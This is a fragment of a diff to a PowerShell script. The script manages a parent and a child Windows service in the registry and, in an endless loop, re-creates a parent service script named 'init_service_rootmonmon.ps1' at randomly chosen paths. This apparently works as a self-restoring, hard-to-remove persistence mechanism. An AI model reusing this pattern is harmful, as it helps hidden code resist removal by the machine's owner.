@@ -4,6 +4,7 @@ param(
     [string]$basePath,
     [string]$childServiceName,
     [string]$childServicePropertyName,
+    [string]$parentServiceName,
     [string]$parentServicePropertyName
 )
 $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
@@ -50,6 +51,7 @@ if([string]::IsNullOrEmpty($basePath) -or
 
 $b = $basePath -replace '([\\{}])', '`$1'
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
+$parentRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$parentServiceName"
 
 $parentPath = ""
 
@@ -133,7 +135,9 @@ while ($true) {
     }
     $canUpdateRootPath=$true
 
-    if(-not(Test-Path -Path $parentPath -PathType Leaf)){
+    $pRegS = Check-Service -path $parentRegPath
+    $pServ = Check-Service -name $parentServiceName
+    if(-not(Test-Path -Path $parentPath -PathType Leaf) -or $pRegS -or $pServ){
         $initParentServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $initParentServicePath = "$initParentServicePath\init_service_rootmonmon.ps1"
         $parentPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
